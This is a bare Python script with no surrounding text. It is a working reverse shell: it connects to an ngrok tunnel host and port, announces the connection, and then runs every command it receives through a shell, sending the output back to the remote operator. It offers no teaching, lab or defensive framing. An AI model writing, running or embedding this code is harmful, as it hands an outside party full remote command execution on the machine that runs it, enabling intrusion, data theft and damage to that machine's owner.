import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('2.tcp.us-cal-1.ngrok.io', 12853))
s.send(b'connection established.\n')

while True:
    command = s.recv(1024).decode('utf-8')
    cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    s.send(cmd.stdout.read())
    s.send(cmd.stderr.read())
